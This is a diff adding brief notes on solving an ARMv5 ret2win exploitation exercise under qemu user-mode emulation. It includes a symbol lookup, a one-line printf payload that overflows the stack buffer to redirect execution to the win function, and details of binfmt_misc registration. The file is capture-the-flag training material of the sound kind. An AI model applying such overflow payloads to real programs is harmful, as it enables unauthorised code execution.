@@ -1,0 +1,24 @@
+readelf -s ret2win_armv5|grep win
+
+printf "%36s\xec\05\01" |./ret2win_armv5
+
+jce         9713    4286  0 10:38 pts/0    00:00:00 /usr/libexec/qemu-binfmt/arm-binfmt-P ./ret2win_armv5 ./ret2win_armv5
+
+
+$ ls /proc/sys/fs/binfmt_misc/
+cli        qemu-aarch64  qemu-armeb  qemu-m68k        qemu-mips64    qemu-mipsn32    qemu-ppc64    qemu-riscv64  qemu-sh4eb        qemu-sparc64   register
+jar        qemu-alpha    qemu-cris   qemu-microblaze  qemu-mips64el  qemu-mipsn32el  qemu-ppc64le  qemu-s390x    qemu-sparc        qemu-xtensa    status
+python3.9  qemu-arm      qemu-hppa   qemu-mips        qemu-mipsel    qemu-ppc        qemu-riscv32  qemu-sh4      qemu-sparc32plus  qemu-xtensaeb
+
+
+cat /proc/sys/fs/binfmt_misc/qemu-arm
+enabled
+interpreter /usr/libexec/qemu-binfmt/arm-binfmt-P
+flags: POC
+offset 0
+magic 7f454c4601010100000000000000000002002800
+mask ffffffffffffff00fffffffffffffffffeffffff
+
+
+$ xxd -ps -l30 ret2win_armv5
+7f454c460101010000000000000000000200280001000000280401003400
